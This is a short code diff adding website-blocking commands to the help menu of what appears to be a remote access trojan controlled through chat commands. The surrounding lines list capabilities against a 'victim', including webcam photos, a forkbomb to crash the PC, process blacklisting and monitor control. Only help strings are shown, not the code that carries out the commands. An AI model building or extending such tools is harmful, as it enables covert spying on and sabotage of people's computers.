@@ -403,6 +403,8 @@ help = {
         'whitelist': ['➡️ `.whitelist <process-name>`', 'Removes the specified process from the blacklist.'],
         'turnoff': ['➡️ `.turnoff`', 'Turns all monitors off'],
         'turnon': ['➡️ `.turnon`', 'Turns all monitors on'],
+        'webblock': ['➡️ `.webblock <url>`', 'Blocks the specified website from being accessed from any browser.'],
+        'webunblock': ['➡️ `.webunblock <url>`', 'Unblocks access to a previously blocked website.'],
         'webcam': ['➡️ `.webcam photo`', 'Takes a photo of a victim\'s webcam (if one is detected)'],
         'forkbomb': ['➡️ `.forkbomb`', 'Creates a self-replicating process until the victim\'s PC crashes.'],
         'volume': ['➡️ `.volume`', 'Change the speaker volume on the victim\'s PC.'],
